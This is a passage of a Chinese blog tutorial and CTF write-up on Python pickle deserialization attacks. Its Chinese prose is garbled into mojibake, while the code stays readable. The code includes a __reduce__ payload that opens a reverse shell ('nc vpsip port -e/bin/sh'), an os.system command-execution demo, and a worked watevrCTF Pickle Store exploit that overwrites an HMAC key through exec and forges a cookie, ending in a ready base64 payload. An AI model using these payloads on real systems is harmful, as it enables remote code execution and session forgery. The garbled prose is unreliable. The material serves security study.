<li><code>c</code>: è¯»å–æœ¬è¡Œçš„å†…å®¹ä½œä¸ºæ¨¡å—å<code>module</code>, è¯»å–ä¸‹ä¸€è¡Œçš„å†…å®¹ä½œä¸ºå¯¹è±¡å<code>object</code>ï¼Œç„¶åå°† <code>module.object</code>ä½œä¸ºå¯è°ƒç”¨å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­</li>
<li><code>(</code>: å°†ä¸€ä¸ªæ ‡è®°å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­ , ç”¨äºç¡®å®šå‘½ä»¤æ‰§è¡Œçš„ä½ç½® . è¯¥æ ‡è®°å¸¸å¸¸æ­é… t æŒ‡ä»¤ä¸€èµ·ä½¿ç”¨ , ä»¥ä¾¿äº§ç”Ÿä¸€ä¸ªå…ƒç»„</li>
<li><code>S</code>: åé¢è·Ÿå­—ç¬¦ä¸² , PVMä¼šè¯»å–å¼•å·ä¸­çš„å†…å®¹ , ç›´åˆ°é‡è§æ¢è¡Œç¬¦ , ç„¶åå°†è¯»å–åˆ°çš„å†…å®¹å‹å…¥åˆ°æ ˆä¸­</li>
<li><code>t</code>: ä»æ ˆä¸­ä¸æ–­å¼¹å‡ºæ•°æ® , å¼¹å°„é¡ºåºä¸å‹æ ˆæ—¶ç›¸åŒ , ç›´åˆ°å¼¹å‡ºå·¦æ‹¬å· . æ­¤æ—¶å¼¹å‡ºçš„å†…å®¹å½¢æˆäº†ä¸€ä¸ªå…ƒç»„ , ç„¶å , è¯¥å…ƒç»„ä¼šè¢«å‹å…¥æ ˆä¸­</li>
<li><code>R</code>: å°†ä¹‹å‰å‹å…¥æ ˆä¸­çš„å…ƒç»„å’Œå¯è°ƒç”¨å¯¹è±¡å…¨éƒ¨å¼¹å‡º , ç„¶åå°†è¯¥å…ƒç»„ä½œä¸ºå¯è°ƒç”¨å‚æ•°çš„å¯¹è±¡å¹¶æ‰§è¡Œè¯¥å¯¹è±¡ ã€‚æœ€åå°†ç»“æœå‹å…¥åˆ°æ ˆä¸­</li>
<li><code>.</code>: ç»“æŸæ•´ä¸ª <code>Pickle</code>ååºåˆ—åŒ–è¿‡ç¨‹</li>
</ol>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="reduce-é­”æœ¯æ–¹æ³•"><a href="#reduce-é­”æœ¯æ–¹æ³•" class="headerlink" title="__reduce__é­”æœ¯æ–¹æ³•"></a><code>__reduce__é­”æœ¯æ–¹æ³•</code></h3><p>ååºåˆ—åŒ–æ¼æ´å‡ºç°åœ¨ <code>__reduce__()</code>é­”æ³•å‡½æ•°ä¸Šï¼Œè¿™ä¸€ç‚¹å’ŒPHPä¸­çš„<code>__wakeup()</code>é­”æœ¯æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯å› ä¸ºæ¯å½“ååºåˆ—åŒ–è¿‡ç¨‹å¼€å§‹æˆ–è€…ç»“æŸæ—¶ , éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ç±»å‡½æ•°ã€‚è€Œè¿™æ°å¥½æ˜¯ååºåˆ—åŒ–æ¼æ´ç»å¸¸å‡ºç°çš„åœ°æ–¹ã€‚ç»å¸¸æ„é€ ä¸€ä¸ªç±»ï¼Œåœ¨è¯¥é­”æœ¯æ–¹æ³•ä¸­åŠ å…¥å±é™©å‡½æ•°</p>
<p>å¦å¤–<code>pickle.loads</code>ä¼šè§£å†³<code>import</code>é—®é¢˜ï¼Œå¯¹äºæœªå¼•å…¥çš„<code>module</code>ä¼šè‡ªåŠ¨å°è¯•<code>import</code>ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´æ•´ä¸ªpythonæ ‡å‡†åº“çš„ä»£ç æ‰§è¡Œã€å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½å¯ä»¥è¿›è¡Œä½¿ç”¨</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc vpsip port -e/bin/sh&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(a))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>å½“ <code>__reduce__()</code>å‡½æ•°è¿”å›ä¸€ä¸ªå…ƒç»„æ—¶ , <strong>ç¬¬ä¸€ä¸ªå…ƒç´ </strong>æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ , è¿™ä¸ªå¯¹è±¡ä¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶è¢«è°ƒç”¨ . <strong>ç¬¬äºŒä¸ªå…ƒç´ </strong>æ˜¯å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•° , åŒæ ·æ˜¯ä¸€ä¸ªå…ƒç»„ã€‚è¿™ç‚¹è·Ÿæˆ‘ä»¬ä¸Šé¢æåˆ°çš„PVMä¸­çš„<code>R</code>æ“ä½œç åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯ä»¥å¯¹æ¯”ä¸‹ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°†ä¹‹å‰å‹å…¥æ ˆä¸­çš„å…ƒç»„å’Œå¯è°ƒç”¨å¯¹è±¡å…¨éƒ¨å¼¹å‡º , ç„¶åå°†è¯¥å…ƒç»„ä½œä¸ºå¯è°ƒç”¨å‚æ•°çš„å¯¹è±¡å¹¶æ‰§è¡Œè¯¥å¯¹è±¡ ã€‚æœ€åå°†ç»“æœå‹å…¥åˆ°æ ˆä¸­ </span><br></pre></td></tr></table></figure></div>

<p>âš ï¸ï¼šåœ¨python2ä¸­åªæœ‰å†…ç½®ç±»æ‰æœ‰<code>__reduce__</code>æ–¹æ³•ï¼Œå³ç”¨<code>class A(object)</code>å£°æ˜çš„ç±»ï¼Œè€Œ<code>python3</code>ä¸­å·²ç»é»˜è®¤éƒ½æ˜¯å†…ç½®ç±»äº†</p>
</blockquote>
<h3 id="å¯èƒ½å‡ºç°çš„ä½ç½®"><a href="#å¯èƒ½å‡ºç°çš„ä½ç½®" class="headerlink" title="å¯èƒ½å‡ºç°çš„ä½ç½®"></a>å¯èƒ½å‡ºç°çš„ä½ç½®</h3><ol>
<li>è§£æè®¤è¯tokenã€sessionçš„æ—¶å€™</li>
<li>å°†å¯¹è±¡Pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶</li>
<li>å°†å¯¹è±¡Pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“</li>
<li>å‚æ•°ä¼ é€’ç»™ç¨‹åº</li>
</ol>
<h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a><strong>å‘½ä»¤æ‰§è¡Œ</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ¨¡ä»¿Epicccalå¸ˆå‚…çš„ä¾‹å­</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    	<span class="comment">#è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°</span></span><br><span class="line">        cmd = <span class="string">&quot;/usr/bin/id&quot;</span> </span><br><span class="line">        <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test = Test2()</span><br><span class="line">    <span class="comment">#æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">    result1 = pickle.dumps(test)</span><br><span class="line">    <span class="comment">#æ‰§è¡Œååºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">    result2 = pickle.loads(result1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __reduce__()é­”æ³•æ–¹æ³•çš„è¿”å›å€¼:</span></span><br><span class="line"><span class="comment"># return(os.system,(cmd,))</span></span><br><span class="line"><span class="comment"># 1.æ»¡è¶³è¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œå…ƒç»„ä¸­æœ‰ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line"><span class="comment"># 2.ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨å‡½æ•° : os.system()</span></span><br><span class="line"><span class="comment"># 3.ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå…ƒç»„:(cmd,),å…ƒç»„ä¸­è¢«è°ƒç”¨çš„å‚æ•° cmd</span></span><br><span class="line"><span class="comment"># 4. å› æ­¤åºåˆ—åŒ–æ—¶è¢«è§£ææ‰§è¡Œçš„ä»£ç æ˜¯ os.system(&quot;/usr/bin/id&quot;)</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>os.systemå’Œos.popen</li>
</ul>
<p>os.system è°ƒç”¨ç³»ç»Ÿå‘½ä»¤ï¼Œå®Œæˆåé€€å‡ºï¼Œè¿”å›ç»“æœæ˜¯å‘½ä»¤æ‰§è¡ŒçŠ¶æ€ï¼Œä¸€èˆ¬æ˜¯0 os.popen() æ— æ³•è¯»å–ç¨‹åºæ‰§è¡Œçš„è¿”å›å€¼,å¯ä»¥ä½¿ç”¨<code>commands.getoutput()</code>è¿™ä¸ªå‡½æ•°(å›æ˜¾ç»“æœ)æ¥è¿›è¡Œä»£æ›¿ï¼Œæ„é€ payload</p>
</blockquote>
<h3 id="æ‹¼æ¥è¦†ç›–key-ä¼ªé€ cookie"><a href="#æ‹¼æ¥è¦†ç›–key-ä¼ªé€ cookie" class="headerlink" title="æ‹¼æ¥è¦†ç›–key,ä¼ªé€ cookie"></a>æ‹¼æ¥è¦†ç›–key,ä¼ªé€ cookie</h3><p>[watevrCTF-2019]Pickle Store</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>è®¾ç½®ä½™é¢ä¸º10000</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line">key=<span class="string">b&#x27;66666666666666666666666666666666&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;money&quot;</span>:<span class="number">10000</span>,<span class="string">&quot;history&quot;</span>:[]&#125;</span><br><span class="line">h = hmac.new(key)</span><br><span class="line">h.update(<span class="built_in">str</span>(cookies).encode())</span><br><span class="line">cookies[<span class="string">&quot;anti_tamper_hmac&quot;</span>] = h.digest().<span class="built_in">hex</span>()</span><br><span class="line">result2 = pickle.dumps(cookies)</span><br><span class="line"><span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure></div>

<p>è¾“å‡º</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#x27;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>ä½†æ˜¯keyçš„è¦†ç›–åªåœ¨å› æ­¤è¯·æ±‚ä¸­ç”Ÿæ•ˆï¼Œä¼ªé€ çš„cookieä¹Ÿå¿…é¡»ä¸€èµ·å‘é€ï¼Œè¿™æ—¶å€™å°±è¦æ‹¼æ¥ä¸¤ä¸ªæ“ä½œï¼ŒæŠŠç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„.å»æ‰ï¼ŒæŠŠç¬¬äºŒä¸ªpickleå¼€å¤´çš„ç‰ˆæœ¬å£°æ˜å»æ‰ï¼Œå°†ä¸¤è€…æ‹¼æ¥</p>
</blockquote>
<p>ç¬¬äºŒä¸ªpickleæµï¼š<br><code>b&quot;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#39;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</code></p>
<p>æ‹¼æ¥å</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x80\x03cbuiltins\nexec\nq\x00X4\x00\x00\x00global key;key = b&#x27;66666666666666666666666666666666&#x27;q\x01\x85q\x02Rq\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#x27;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</span><br></pre></td></tr></table></figure></div>

<p>base64ç¼–ç å,æ³¨æ„è¦ç”¨pythonè„šæœ¬ï¼Œå› ä¸ºpythonä¸­å­—ç¬¦ä¸²<strong>b å‰ç¼€ä»£è¡¨çš„å°±æ˜¯bytes</strong> </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gANjYnVpbHRpbnMKZXhlYwpxAFg0AAAAZ2xvYmFsIGtleTtrZXkgPSBiJzY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2J3EBhXECUnEDfXEAKFgFAAAAbW9uZXlxAU0QJ1gHAAAAaGlzdG9yeXECXXEDWBAAAABhbnRpX3RhbXBlcl9obWFjcQRYIAAAAGNjYjQ4N2VlYzFjYjY2ZGRhOGQwMGE4MTIxYWViNGJmcQV1Lg==</span><br></pre></td></tr></table></figure></div>


        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>æ ‡é¢˜:</strong> python pickleååºåˆ—åŒ–æ¼æ´</li>
        <li><strong>ä½œè€…:</strong> Sl0th</li>
        <li><strong>åˆ›å»ºäº
                :</strong> 2022-08-03 23:11:44</li>
        
            <li>
                <strong>æ›´æ–°äº
                    :</strong> 2024-07-03 23:29:01
            </li>
        
        <li>
            <strong>é“¾æ¥:</strong> http://sl0th.top/2022/08/03/python-pickleååºåˆ—åŒ–æ¼æ´/
        </li>
        <li>
            <strong>
                ç‰ˆæƒå£°æ˜:
            </strong>
            

            
                æœ¬æ–‡ç« é‡‡ç”¨ <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> è¿›è¡Œè®¸å¯ã€‚
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/web/">#web</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/python/">#python</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">M1 macä¸‹æ­å»ºä½¿ç”¨qt creator + QMYSQLé©±åŠ¨</span>
                                <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2022/07/20/Java-Web%E5%AD%A6%E4%B9%A0/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Java Webå­¦ä¹ </span>
                                <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        è¯„è®º
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          reaction: false,
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">ç›®å½•</div>
        <div class="page-title">python pickleååºåˆ—åŒ–æ¼æ´</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">Python Pickleååºåˆ—åŒ–æ¼æ´</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">åŸºç¡€çŸ¥è¯†</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Pickle-x2F-CPickle"><span class="nav-text">0x00:Pickle&#x2F;CPickle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Pickle%E5%BA%93%E5%8F%8A%E5%87%BD%E6%95%B0"><span class="nav-text">0x01:Pickleåº“åŠå‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dump-x2F-load"><span class="nav-text">dump&#x2F;load</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dumps-x2F-loads"><span class="nav-text">dumps&#x2F;loads</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-PVM%E2%80%93python%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="nav-text">0x02 PVMâ€“pythonè™šæ‹Ÿæœº</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">æ¼æ´åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#reduce-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">__reduce__é­”æœ¯æ–¹æ³•</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="nav-text">å¯èƒ½å‡ºç°çš„ä½ç½®</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">å‘½ä»¤æ‰§è¡Œ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5%E8%A6%86%E7%9B%96key-%E4%BC%AA%E9%80%A0cookie"><span class="nav-text">æ‹¼æ¥è¦†ç›–key,ä¼ªé€ cookie</span></a></li></ol></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sl0th</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        å…±æ’°å†™äº† 44 ç¯‡æ–‡ç« 
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">è®¿é—®äººæ•°</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">æ€»è®¿é—®é‡</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">ç”± <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> é©±åŠ¨</span>
            <span class="text-sm lg:block">ä¸»é¢˜&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
        </div>
        
        
            <div>
                åšå®¢å·²è¿è¡Œ <span class="odometer" id="runtime_days" ></span> å¤© <span class="odometer" id="runtime_hours"></span> å°æ—¶ <span class="odometer" id="runtime_minutes"></span> åˆ†é’Ÿ <span class="odometer" id="runtime_seconds"></span> ç§’
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>





    
<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>




</body>
</html>
